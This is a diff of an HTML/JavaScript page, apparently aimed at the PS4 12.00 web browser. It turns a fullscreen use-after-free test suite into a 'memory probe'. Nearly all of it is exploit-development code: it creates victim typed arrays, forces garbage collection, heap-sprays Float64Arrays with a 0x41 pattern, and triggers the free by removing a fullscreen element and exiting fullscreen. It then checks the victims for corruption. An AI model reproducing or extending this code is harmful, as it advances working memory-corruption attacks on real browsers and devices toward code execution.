@@ -2,140 +2,147 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 Fullscreen UAF - Test Suite</title>
+<title>PS4 Fullscreen UAF - Memory Probe v1</title>
 </head>
-<body style="background:#222;color:#fff;">
+<body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>PS4 12.00 - Fullscreen UAF Test Suite</h2>
+<h2>UAF Memory Probe v1 (Pre-Crash Observation)</h2>
 
-<button onclick="runTest(1)">Teste 1 — Completo (GC + Spray)</button><br><br>
-<button onclick="runTest(2)">Teste 2 — Sem GC</button><br><br>
-<button onclick="runTest(3)">Teste 3 — Sem Spray</button><br><br>
-<button onclick="runTest(4)">Teste 4 — Apenas remove + exitFullscreen</button>
+<button onclick="runProbe()">Run Probe</button>
 
-<div id="log" style="margin-top:20px;"></div>
+<pre id="log" style="height:400px;overflow:auto;background:#000;padding:10px;"></pre>
 
 <script>
-const PATTERN = 2.121995791e-314;
+const PATTERN = 2.121995791e-314; // 0x4141414141414141
 
 function log(msg) {
-    try { console.log(msg); } catch(e){}
-    document.getElementById("log").innerHTML += "<p>" + msg + "</p>";
+    console.log(msg);
+    document.getElementById("log").textContent += msg + "\n";
 }
 
-function setupHeap() {
-    let controllers = [];
+let victims = {};
 
-    for(let i = 0; i < 5000; i++) {
-        let arr = new Float64Array(8);
-        arr[0] = i;
-        controllers.push(arr);
-    }
+function setupVictims() {
+    log("[*] Criando objetos vítimas...");
 
-    return controllers;
+    victims.f64 = new Float64Array(8);
+    victims.f64[0] = 13.37;
+
+    victims.u32 = new Uint32Array(16);
+    victims.u32[0] = 0x1337;
+
+    victims.buf = new ArrayBuffer(64);
+    victims.dv = new DataView(victims.buf);
+    victims.dv.setUint32(0, 0xdeadbeef, true);
+
+    window.victims = victims;
 }
 
 function setupFullscreen() {
     let fsTarget = document.createElement("div");
-    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
-    fsTarget.style.background = "black";
-    fsTarget.style.width = "100%";
-    fsTarget.style.height = "100%";
     fsTarget.style.position = "absolute";
     fsTarget.style.top = "0";
     fsTarget.style.left = "0";
+    fsTarget.style.width = "100%";
+    fsTarget.style.height = "100%";
+    fsTarget.style.background = "black";
+    fsTarget.innerHTML = "<h1 style='color:white;text-align:center;margin-top:20%'>FULLSCREEN<br>Press OPTIONS</h1>";
 
     document.body.appendChild(fsTarget);
 
-    if (fsTarget.webkitRequestFullscreen) {
-        fsTarget.webkitRequestFullscreen();
-    } else {
-        document.documentElement.webkitRequestFullscreen?.();
-    }
+    fsTarget.webkitRequestFullscreen?.();
 
     return fsTarget;
 }
 
-function doGC(controllers) {
-    log("[*] Forçando GC...");
-    controllers = null;
-
-    for (let i = 0; i < 20000; i++) {
-        new ArrayBuffer(0x10000);
-    }
-}
-
 function doSpray() {
-    log("[*] Executando spray...");
+    log("[*] Heap spray iniciado...");
+
     let spray = [];
 
-    for(let i = 0; i < 8000; i++) {
-        let p = new Float64Array(10);
-        p.fill(PATTERN);
-        spray.push(p);
+    for (let i = 0; i < 10000; i++) {
+        let arr = new Float64Array(8);
+        arr.fill(PATTERN);
+        spray.push(arr);
     }
 
     return spray;
 }
 
+function doGC() {
+    log("[*] Forçando GC...");
+    for (let i = 0; i < 20000; i++) {
+        new ArrayBuffer(0x10000);
+    }
+}
+
+function checkVictims(stage) {
+    log("---- CHECK (" + stage + ") ----");
+
+    try {
+        log("[F64] val=" + victims.f64[0]);
+    } catch(e) {
+        log("[F64 ERROR] " + e);
+    }
+
+    try {
+        log("[U32] val=" + victims.u32[0]);
+    } catch(e) {
+        log("[U32 ERROR] " + e);
+    }
+
+    try {
+        log("[DV] val=" + victims.dv.getUint32(0, true));
+    } catch(e) {
+        log("[DV ERROR] " + e);
+    }
+
+    try {
+        log("[META] f64.length=" + victims.f64.length +
+            " byteLength=" + victims.f64.byteLength);
+    } catch(e) {
+        log("[META ERROR] " + e);
+    }
+}
+
 function trigger(fsTarget) {
-    log("[*] Trigger: remove + exitFullscreen");
+    log("[*] Trigger UAF (remove + exitFullscreen)");
 
     try {
         fsTarget.remove();
 
-        if (document.webkitIsFullScreen || document.fullscreenElement) {
-            document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
-        }
+        // 🔥 CHECK CRÍTICO — antes do crash
+        checkVictims("PRE-EXIT");
+
+        document.webkitExitFullscreen?.();
+
     } catch(e) {
-        log("[ERRO] " + e);
+        log("[TRIGGER ERROR] " + e);
     }
 
-    setTimeout(() => location.reload(), 500);
+    setTimeout(() => location.reload(), 1000);
 }
 
-function runTest(mode) {
-    const logDiv = document.getElementById("log");
-    logDiv.innerHTML = "<p>Running... Press OPTIONS</p>";
+function runProbe() {
+    document.getElementById("log").textContent = "";
+    log("[*] Iniciando probe...");
 
-    log("[*] Iniciando teste " + mode);
+    setupVictims();
 
-    let controllers = setupHeap();
     let fsTarget = setupFullscreen();
 
     window.onblur = function() {
-        log("[*] onblur disparado");
+        log("[*] onblur recebido");
 
-        // =========================
-        // TESTES
-        // =========================
+        // Ordem importante
+        doGC();
 
-        if (mode === 1) {
-            // COMPLETO
-            doGC(controllers);
-            let spray = doSpray();
+        let spray = doSpray();
 
-            setTimeout(() => trigger(fsTarget), 3000);
-        }
-
-        else if (mode === 2) {
-            // SEM GC
-            let spray = doSpray();
-
-            setTimeout(() => trigger(fsTarget), 3000);
-        }
-
-        else if (mode === 3) {
-            // SEM SPRAY
-            doGC(controllers);
-
-            setTimeout(() => trigger(fsTarget), 3000);
-        }
-
-        else if (mode === 4) {
-            // MINIMO (CIRÚRGICO)
-            setTimeout(() => trigger(fsTarget), 3000);
-        }
+        // Pequeno delay para estabilizar heap
+        setTimeout(() => {
+            trigger(fsTarget);
+        }, 2000);
     };
 }
 </script>
